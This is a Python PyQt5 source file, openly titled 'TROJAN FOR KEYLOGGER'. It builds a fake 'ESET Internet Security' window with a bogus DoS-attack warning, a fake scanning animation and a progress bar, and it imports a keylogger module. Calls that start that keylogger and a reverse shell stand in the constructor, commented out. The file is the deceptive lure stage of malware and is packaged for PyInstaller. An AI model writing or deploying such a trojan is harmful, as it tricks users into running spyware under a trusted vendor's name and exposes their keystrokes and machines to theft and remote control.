# TROJAN FOR KEYLOGGER
import keylogger
from PyQt5.QtWidgets import QLabel, QWidget, QProgressBar, QPushButton, QApplication, QMessageBox, QMainWindow
from PyQt5.QtCore import QBasicTimer
from PyQt5.QtGui import QImage, QPalette, QBrush, QPixmap, QMovie
import sys
import os

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

class CoverApplication(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()
        #keylogger.run()    ## START KEYLOGGER
        #keylogger.conn()    ## START REVSHELL

    def initUI(self):
        self.setBackground()

        #fake code gif
        self.label = QLabel()
        self.setCentralWidget(self.label)
        self.movie = QMovie(resource_path("src//keylogger//assets//fakecode.gif"))
        self.label.setMovie(self.movie)

        #proggres bar
        self.pbar = QProgressBar(self)
        self.pbar.setGeometry(30, 40, 700, 30)
        self.pbar.move(175, 420)

        #button
        self.btn = QPushButton('Start', self)
        self.btn.setGeometry(100, 100, 100, 30)
        self.btn.move(450, 460)
        self.btn.clicked.connect(self.doAction)

        self.timer = QBasicTimer()
        self.step = 0

        self.setGeometry(100, 100, 1000, 500)
        self.setWindowTitle('ESET Internet Security')
        self.show()
        self.setFixedSize(1000, 500)
        
        popupWarning = QWidget()
        popupWarning.setWindowTitle('Warning')
        popupWarning.setGeometry(100, 100, 100, 10)

        popupWarning.buttonReply = QMessageBox.information(self, 'WARNING!', "DoS attack detected. Run the wizard to remove it.", QMessageBox.Ok)
        if popupWarning.buttonReply == QMessageBox.Ok:
            popupWarning.hide()
            return
        popupWarning.show()

    def timerEvent(self, e):
        if self.step >= 100:
            self.timer.stop()
            self.movie.stop()
            self.label.hide()
            self.btn.setText('Finished')
            #popup
            self.hide()
            popup = QWidget()
            popup.setWindowTitle('Done')
            popup.setGeometry(100, 100, 100, 10)

            popup.buttonReply = QMessageBox.information(self, 'Finished', "DoS attack removed succesfully.", QMessageBox.Ok)
            if popup.buttonReply == QMessageBox.Ok:
                popup.hide()
                self.show()
                return

            popup.show()
            return

        self.step = self.step + 1
        self.pbar.setValue(self.step)

    def doAction(self):
        self.movie.start()
        if self.timer.isActive():
            self.timer.stop()
            self.movie.stop()
            #popup are you sure
            popupSure = QWidget()
            popupSure.setWindowTitle('Confirm')
            popupSure.setGeometry(100, 100, 100, 10)

            popupSure.buttonReply = QMessageBox.question(self, 'Confirm', "Are you sure you want to stop?", QMessageBox.Yes | QMessageBox.No)
            if popupSure.buttonReply == QMessageBox.Yes:
                self.pbar.setValue(0)
                self.step = 0
                self.btn.setText('Start')
                popupSure.hide()
                self.label.hide()
            else:
                self.btn.setText('Continue')
                popupSure.hide()
            
        else:
            self.timer.start(100, self)
            self.btn.setText('Stop')
            
    def setBackground(self):
        background = QImage(resource_path("src//keylogger//assets//background.png"))
        background = background.scaled(1000, 500)
        pallete = QPalette()
        pallete.setBrush(QPalette.Window, QBrush(background))
        self.setPalette(pallete)
        
if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = CoverApplication()
    sys.exit(app.exec_())